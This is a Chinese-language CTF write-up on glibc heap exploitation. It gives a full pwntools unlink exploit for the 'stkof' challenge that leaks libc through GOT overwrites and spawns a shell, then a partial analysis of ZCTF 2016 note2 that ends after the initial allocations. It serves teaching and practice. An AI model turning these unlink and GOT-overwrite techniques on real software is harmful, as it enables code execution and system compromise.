
```python
from pwn import *
context(arch = "amd64", os = "linux", log_level = "debug")
io = process("stkof")
#gdb.attach(io,"b *0x400C8A")
elf = ELF("stkof")
libc = ELF("libc.so.6")

def malloc(size):
    io.sendline(b'1')
    io.sendline(str(size).encode())
    io.recvuntil(b"OK\n")

def edit(index,size,payload):
    io.sendline(b'2')
    io.sendline(str(index).encode())
    io.sendline(str(size).encode())
    io.send(payload)
    io.recvuntil(b"OK\n")

def free(index):
    io.sendline(b'3')
    io.sendline(str(index).encode())

s = 0x602140 #s的地址
ptr = 0x602140 + 0x10 #&s[2]
#pause()
malloc(0x20) # 这个大小随意
malloc(0x30)
malloc(0x80) # 这个要大于fastbin的最大值，不然没法触发unlink
payload = p64(0) # fake chunk的presize
payload += p64(0x20) # fake chunk的size
# FD->bk != P || BK->fd != P;fd和bk的设置是为了绕过这个检查
payload += p64(ptr - 0x18) # fake chunk的fd，即&s[2]-0x18
payload += p64(ptr - 0x10) # fake chunk的bk，即&s[2]-0x10
payload += p64(0x20) # 这里是为了绕过chunksize(P) != prev_size (next_chunk(P))这个检查
payload = payload.ljust(0x30,b'a')
payload += p64(0x30) # chunk3的presize
payload += p64(0x90) # chunk3的size，这里主要把inuse标志位改成0，这样free时就能触发unlink
edit(2,len(payload),payload)
free(3)
io.recvuntil(b"OK\n")
payload = b'a'*0x8 + p64(elf.got["free"]) + p64(elf.got["puts"]) + p64(elf.got["atoi"])
edit(2,len(payload),payload)
payload = p64(elf.plt["puts"])
edit(0,len(payload),payload)
free(1)
puts_addr = u64(io.recvuntil(b"\n",drop=True).ljust(0x8,b'\x00'))
log.info(hex(puts_addr))
base = puts_addr - libc.symbols["puts"]
system = base + libc.symbols["system"]
payload = p64(system)
edit(2,len(payload),payload)
io.sendline(b'/bin/sh\x00')
io.interactive()
```

# 2016 ZCTF note2

查看保护，Partial RELRO表明got表可写

![](upload/attach/202603/1002337_Y5Z5SMV94VJP8A7.png)

从main函数可以看到是一个菜单题，有四个功能分别时new note，show note，edit note，delete note

```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
    setvbuf(stdin, 0LL, 2, 0LL);
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stderr, 0LL, 2, 0LL);
    alarm(0x3Cu);
    puts("Input your name:");
    sub_4009BD((__int64)&unk_6020E0, 64LL, '\n');
    puts("Input your address:");
    sub_4009BD((__int64)&unk_602180, 96LL, 10);
    while ( 1 )
    {
        switch ( (unsigned int)sub_400AFB() )
        {
            case 1u:
                sub_400B96();
                break;
            case 2u:
                sub_400CE6();
                break;
            case 3u:
                sub_400D43();
                break;
            case 4u:
                sub_400C67();
                break;
            case 5u:
                puts("Bye~");
                exit(0);
            case 6u:
                exit(0);
            default:
                continue;
        }
    }
}
__int64 sub_400AFB()
{
    puts("1.New note\n2.Show note\n3.Edit note\n4.Delete note\n5.Quit\noption--->>");
    return sub_400A4A();
}
unsigned __int64 __fastcall sub_4009BD(__int64 a1, __int64 a2, char a3)
{
    char buf; // [rsp+2Fh] [rbp-11h] BYREF
    unsigned __int64 i; // [rsp+30h] [rbp-10h]
    ssize_t v7; // [rsp+38h] [rbp-8h]
    for ( i = 0LL; a2 - 1 > i; ++i )
    {
        v7 = read(0, &buf, 1uLL);
        if ( v7 <= 0 )
            exit(-1);
        if ( buf == a3 )
            break;
        *(_BYTE *)(i + a1) = buf;
    }
    *(_BYTE *)(a1 + i) = 0;
    return i;
}
```

看功能一，new note，可以自定义申请的内存大小，但是不超过0x80，接着还可以往内存里输入内容，过滤"%"，
不过过滤这个可以用`\0`截断绕过，接着就是把申请的内存地址放入`ptr`数组里，`size`放入`qword_602140`数组里，
最多只能申请四次，id是从0开始的。`sub_4009BD((__int64)size_4, size, 10);`这里有个漏洞，这个函数源码看上面，
函数里`i`定义的是无符号数，而`a2`是有符号整数，因此`a2-1 > i`比较时会将`a2-1`转为无符号数，
如果我们设置`a2`为0，也就是内存的`size`为0，那么`a2-1`就变成-1，-1在无符号数里是很大的，
我们就可以输入很长的内容，而因为我们输入的`size`是0，`malloc(0)`会自动分配0x20大小的chunk，
因为能分配的最小chunk大小是0x20，那我们就可以实现堆溢出了。

```c
int sub_400B96()
{
    unsigned int v1; // eax
    unsigned int size; // [rsp+4h] [rbp-Ch]
    void *size_4; // [rsp+8h] [rbp-8h]
    if ( (unsigned int)dword_602160 > 3 )
        return puts("note lists are full");
    puts("Input the length of the note content:(less than 128)");
    size = sub_400A4A();
    if ( size > 0x80 )
        return puts("Too long");
    size_4 = malloc(size);
    puts("Input the note content:");
    sub_4009BD((__int64)size_4, size, 10);
    sub_400B10(size_4);
    *(&ptr + (unsigned int)dword_602160) = size_4;
    qword_602140[dword_602160] = size;
    v1 = dword_602160++;
    return printf("note add success, the id is %d\n", v1);
}
//这个函数会过滤掉%符号
const char *__fastcall sub_400B10(const char *a1)
{
    const char *result; // rax
    int i; // [rsp+18h] [rbp-18h]
    int v3; // [rsp+1Ch] [rbp-14h]
    v3 = 0;
    for ( i = 0; i <= strlen(a1); ++i )
    {
        if ( a1[i] != '%' )
            a1[v3++] = a1[i];
    }
    result = &a1[v3];
    *result = 0;
    return result;
}
```

看功能二，也就是打印note的内容

```c
int sub_400CE6()
{
    __int64 v0; // rax
    int v2; // [rsp+Ch] [rbp-4h]
    puts("Input the id of the note:");
    LODWORD(v0) = sub_400A4A();
    v2 = v0;
    if ( (unsigned int)v0 <= 3 )
    {
        v0 = (__int64)*(&ptr + (int)v0);
        if ( v0 )
            LODWORD(v0) = printf("Content is %s\n", (const char *)*(&ptr + v2));
    }
    return v0;
}
```

看功能三，这里就是选择对note的内容进行覆写操作还是追加操作，就是修改note的内容而已。

```c
unsigned __int64 sub_400D43()
{
    _BYTE *v0; // rbx
    int v2; // [rsp+8h] [rbp-E8h]
    int v3; // [rsp+Ch] [rbp-E4h]
    char *src; // [rsp+10h] [rbp-E0h]
    __int64 v5; // [rsp+18h] [rbp-D8h]
    char dest[128]; // [rsp+20h] [rbp-D0h] BYREF
    void *v7; // [rsp+A0h] [rbp-50h]
    unsigned __int64 v8; // [rsp+D8h] [rbp-18h]
    v8 = __readfsqword(0x28u);
    if ( dword_602160 )
    {
        puts("Input the id of the note:");
        v2 = sub_400A4A();
        if ( (unsigned int)v2 <= 3 )
        {
            src = (char *)*(&ptr + v2);
            v5 = qword_602140[v2];
            if ( src )
            {
                puts("do you want to overwrite or append?[1.overwrite/2.append]");
                v3 = sub_400A4A();
                if ( v3 == 1 || v3 == 2 )
                {
                    if ( v3 == 1 )
                        dest[0] = 0;
                    else
                        strcpy(dest, src);
                    v7 = malloc(0xA0uLL);
                    strcpy((char *)v7, "TheNewContents:");
                    printf((const char *)v7);
                    sub_4009BD((__int64)v7 + 15, 144LL, 10);
                    sub_400B10((const char *)v7 + 15);
                    v0 = v7;
                    v0[v5 - strlen(dest) + 14] = 0;
                    strncat(dest, (const char *)v7 + 15, 0xFFFFFFFFFFFFFFFFLL);
                    strcpy(src, dest);
                    free(v7);
                    puts("Edit note success!");
                }
                else
                {
                    puts("Error choice!");
                }
            }
            else
            {
                puts("note has been deleted");
            }
        }
    }
    else
    {
        puts("Please add a note!");
    }
    return __readfsqword(0x28u) ^ v8;
}
```

功能四就是删除note回收内存。

```c
int sub_400C67()
{
    __int64 v0; // rax
    int v2; // [rsp+Ch] [rbp-4h]
    puts("Input the id of the note:");
    LODWORD(v0) = sub_400A4A();
    v2 = v0;
    if ( (unsigned int)v0 <= 3 )
    {
        v0 = (__int64)*(&ptr + (int)v0);
        if ( v0 )
        {
            free(*(&ptr + v2));
            *(&ptr + v2) = 0LL;
            qword_602140[v2] = 0LL;
            LODWORD(v0) = puts("delete note success!");
        }
    }
    return v0;
}
```

## 思路

- 利用 unlink 修改 `ptr[1]` 为 `&ptr[1]-0x18`。
- 利用 new note 的堆溢出修改 `ptr[0]` 为 `atoi@got` 地址。
- 利用 show note 能把 `atoi@got` 内容打印出来，这样就可以泄漏 libc 基址。
- 利用 edit 功能修改 `ptr[0]` 也就是 `atoi@got` 为 `system` 函数地址，接着输入 `/bin/sh`，`atoi("/bin/sh")` 就变成了 `system("/bin/sh")`。

## 分析过程

先写下菜单的交互

```python
def new(size,payload):
    io.recvuntil(b"option--->>\n")
    io.sendline(b'1')
    io.recvuntil(b"Input the length of the note content:(less than 128)\n")
    io.sendline(str(size).encode())
    io.recvuntil(b"Input the note content:\n")
    io.sendline(payload)

def show(index):
    io.recvuntil(b"option--->>\n")
    io.sendline(b'2')
    io.recvuntil(b"Input the id of the note:\n")
    io.sendline(str(index).encode())
    io.recvuntil(b"Content is ")
    content = u64(io.recvuntil(b"\n",drop=True).ljust(0x8,b'\x00'))
    return content

def edit(index,payload):
    io.recvuntil(b"option--->>\n")
    io.sendline(b'3')
    io.recvuntil(b"Input the id of the note:\n")
    io.sendline(str(index).encode())
    io.recvuntil(b"do you want to overwrite or append?[1.overwrite/2.append]\n")
    io.sendline(b'1')
    io.recvuntil(b":")
    io.sendline(payload)

def delete(index):
    io.recvuntil(b"option--->>\n")
    io.sendline(b'4')
    io.recvuntil(b"Input the id of the note:\n")
    io.sendline(str(index).encode())
```

利用 new 功能申请三个内存，注意`malloc(0)`会分配最小chunk也就是0x20，分别分配了0x20，0x40，0x90大小的chunk，记为`chunk0`，`chunk1`，`chunk2`

![](upload/attach/202603/1002337_42TBG59TXDFYT53.png)

```python
ptr = 0x0000000000602120
io.recvuntil(b"\n")
io.sendline(b'aa')
io.recvuntil(b"\n")
io.sendline(b'aa')
new(0,b'aa') #chunk0
new(0x30,b'aa') #chunk1
new(0x80,b'aa') #chunk2
```

删除`note0`，此时`chunk0`会放入fastbin
